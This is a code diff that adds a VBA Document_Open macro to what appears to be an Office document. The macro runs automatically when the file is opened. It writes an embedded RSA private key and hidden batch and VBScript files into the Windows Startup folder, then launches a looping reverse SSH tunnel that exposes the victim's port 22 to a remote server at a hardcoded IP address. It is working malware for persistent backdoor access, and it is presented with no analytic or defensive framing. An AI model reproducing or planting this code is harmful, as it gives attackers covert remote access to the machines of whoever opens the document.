@@ -1,0 +1,84 @@
+Private Sub Document_Open()
+    Dim fso, keyFile, vbsFile, file, WshShell, startupPath, keyPath, vbsPath, cmdPath
+    Dim keyContentPart1 As String, keyContentPart2 As String, keyContentPart3 As String
+    Dim keyContent As String
+
+    Set WshShell = CreateObject("WScript.Shell")
+    startupPath = WshShell.SpecialFolders("Startup")
+    keyPath = startupPath & "\id_rsa_server"
+    cmdPath = startupPath & "\ssh_connect.cmd"
+    vbsPath = startupPath & "\ssh_connect.vbs"
+
+    ' Private Key in Blöcke aufteilen (max. 25 Zeilenfortsetzungen pro Block)
+    keyContentPart1 = "-----BEGIN RSA PRIVATE KEY-----" & vbCrLf & _
+    "MIIEpAIBAAKCAQEAy7JhQ05WYOONdBvtHaX2TZTWEEwWTSHjyYPiupbSFGuqgl3k" & vbCrLf & _
+    "ah4bGDclEjk4WNLeVXjMBJcFr56AXtm08boZ0gA6effwO2AHRUibR77Wm06OsyWe" & vbCrLf & _
+    "XVUl/7stDxdLyonsfh+/3Nrhi19HzYrT8UsbG0Rt2LFWzcJ9zooytMKb/AzRPcdo" & vbCrLf & _
+    "R6zPZFXmV1ZVPsOyuzpQ2avqNEQUkoyyf+7E3Z+57/SqJ0c4fCfxN22CfDPPOPud" & vbCrLf & _
+    "6YSeDsNykSOVGRv12wFjIRtxIYwFB29Ovj0g8UJEJDsWZFPkG3KIHqX/1u6m37jI" & vbCrLf & _
+    "VpQuil/4TBEkiPRBaQpmJJtqkOzh/Oxs7+XPiQIDAQABAoIBAFqabN3RteUhwhTv" & vbCrLf & _
+    "qQADhnNKrQ6RsWe8l8PWGF7TX/06SJz1I3i6DGYwfRpGflQv8zoEYYb3H83WTBYk" & vbCrLf & _
+    "cvIES6DXfisrR905IPLF0V/PuEhbYGi55l9wVNcTi/7G52ze/WS6PY6Ag0sJZfg8" & vbCrLf & _
+    "dHpC5Hsz7EIy2z/pbykT2msBlv08cQ14NqcTmWrIRuxak+EVGxLuszAazUzAc4dp" & vbCrLf & _
+    "Qfe3xJ59Ow1TpHdaEJOEpQk5bJsV9S5LAnd1tS0fehB2ZSiaI2zVHr97Ua6HNFcS" & vbCrLf & _
+    "t7Y5VERYSXHuyLhW6HSiCI3IZkEdn5KCKgAkseFoYb5awxy/7j7CB8tBrpq36A+9" & vbCrLf & _
+    "Gu3LUHsCgYEA6j6ZmRdyHcddVqbLbKrBR7OXSEBX7QdKrROZ7UepLHiVBXRZu/1G" & vbCrLf & _
+    "TEtQXrgivp1dzcLmSL08OOzler2dcYAFI3RdJ8PCgOtnTFhev812mr64h1hWW65+" & vbCrLf & _
+    "r7QWcp3R6oQWerUtWez/CWRMAvmaBesyPRKEeElaDlXECxlIXruigNMCgYEA3p16" & vbCrLf & _
+    "C33uJ3yBrEqeW842XL/8hW67JK97QuuGzi+70fVhPzmUkLA7YpWxV/vdfxbz07sr" & vbCrLf & _
+    "c8qusOwrCY/jwjSdrr3pkK5Ug+DBx7G6wXAGxgKnVa9YdROegxuWr0lhFkEed2sH" & vbCrLf & _
+    "ZMjevhdISNmjUdrSvglM7vTCK/CPhmacIfSt1LMCgYEAtkLJHp5ok5UZIiAb7kya" & vbCrLf & _
+    "oSCy2GwAPhTLXQoAXejBUDHuudTDMYurlBeRzHF3z1sAruY0amqbnittjuhUxgh3" & vbCrLf & _
+    "dxPGm/css0T3Fic4agMDgvpc+Cqa3zFRr4LvaHU17USjfQzV4b+O3Y7lufbeijZr" & vbCrLf & _
+    "26s52aIxaTAAnyYn8lYK5jMCgYEAtzdAZQjl4xWz28sl/kT/tOJFwMPbvlu2xOL3" & vbCrLf
+
+    keyContentPart2 = "decPW8Pqn5CSV2rT1VWCOfmO2LRZRN986bXchLw6x4nnV8TaKiEfg/YWlNt8YRBD" & vbCrLf & _
+    "tkSvLnSsp/bChMj64sjoAagRAbHik0JBOY+g0y5yTZLhudKxM7qP2PMUg/lfBqyY" & vbCrLf & _
+    "v9GS58UCgYAuC/easKJF4K2RcWdmrO/HVGveo+eD/s/dmm5ifwh9/Fnepo3SUmyC" & vbCrLf & _
+    "rkMBUZ8pBSLnKEPZF0ljamjfcxoV7MyroRJ2tcRETP07rYasnkCaM6/P5x8U0Im+" & vbCrLf & _
+    "/dhzycjAb2/WY6OWgadG3PWK9YKFvwjFHMpNLQw/j8hV9+fBDWOSlw==" & vbCrLf & _
+    "-----END RSA PRIVATE KEY-----"
+
+    keyContent = keyContentPart1 & keyContentPart2
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(keyPath) Then
+        Set keyFile = fso.CreateTextFile(keyPath, True)
+        keyFile.Write keyContent
+        keyFile.Close
+        SetAttr keyPath, vbHidden
+    End If
+
+    ' CMD-Datei für SSH-Verbindung mit -R und ServerAliveInterval und Wiederholung alle 10 Minuten, 5 Versuche
+    If Not fso.FileExists(cmdPath) Then
+        Set file = fso.CreateTextFile(cmdPath, True)
+        file.WriteLine "@echo off"
+        file.WriteLine ":loop"
+        file.WriteLine "set count=0"
+        file.WriteLine ":try"
+        file.WriteLine "set /a count+=1"
+        file.WriteLine "ssh -i """ & keyPath & """ -o ServerAliveInterval=60 -R 10100:localhost:22 ubuntu@193.123.189.154"
+        file.WriteLine "if %count% lss 5 goto try"
+        file.WriteLine "timeout /t 600 >nul"
+        file.WriteLine "goto loop"
+        file.Close
+        SetAttr cmdPath, vbHidden Or vbSystem Or vbReadOnly
+    End If
+
+    ' VBS-Datei, die versteckt das CMD startet (einmalig)
+    If Not fso.FileExists(vbsPath) Then
+        Set vbsFile = fso.CreateTextFile(vbsPath, True)
+        vbsFile.WriteLine "On Error Resume Next"
+        vbsFile.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
+        vbsFile.WriteLine "WshShell.Run Chr(34) & """ & cmdPath & """ & Chr(34), 0, False"
+        vbsFile.Close
+        SetAttr vbsPath, vbHidden Or vbSystem Or vbReadOnly
+    End If
+
+    ' Nach dem Erstellen: VBS-Skript sofort ausführen
+    If fso.FileExists(vbsPath) Then
+        WshShell.Run Chr(34) & vbsPath & Chr(34), 0, False
+    End If
+
+    Set WshShell = Nothing
+End Sub
